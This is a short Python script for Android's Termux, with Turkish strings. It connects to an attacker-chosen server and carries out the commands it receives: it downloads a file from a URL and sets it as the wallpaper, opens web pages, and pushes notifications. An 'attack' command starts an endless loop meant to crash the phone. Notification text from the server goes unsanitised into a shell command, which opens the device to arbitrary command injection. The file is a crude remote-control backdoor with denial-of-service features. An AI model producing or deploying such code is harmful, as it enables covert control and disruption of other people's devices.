client.py

import socket import os import urllib.request

SERVER_IP = input("Server IP gir: ") PORT = int(input("Port gir: "))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((SERVER_IP, PORT)) s.send("[✓] Baglanti basarili".encode()) except: print("[!] Baglanti hatasi") exit()

def arkaplan_degistir(url): try: urllib.request.urlretrieve(url, "arka.jpg") os.system("termux-wallpaper -f arka.jpg") s.send("[✓] Arkaplan degistirildi".encode()) except: s.send("[!] Arkaplan degistirilemedi".encode())

def google_ac(): os.system("termux-open-url https://www.google.com") s.send("[✓] Google acildi".encode())

def uyari_gonder(mesaj): os.system(f'termux-notification --title "UYARI" --content "{mesaj}"') s.send("[✓] Uyari gonderildi".encode())

def telefon_cokert(): while True: os.system("echo 'Fsociety!' > /dev/null")

while True: try: komut = s.recv(1024).decode().strip() if komut.startswith("arkaplan "): _, url = komut.split(" ", 1) arkaplan_degistir(url) elif komut == "google": google_ac() elif komut.startswith("uyari "): _, mesaj = komut.split(" ", 1) uyari_gonder(mesaj) elif komut == "saldiri": telefon_cokert() elif komut == "exit": break else: s.send("[!] Gecersiz komut".encode()) except: break

s.close()

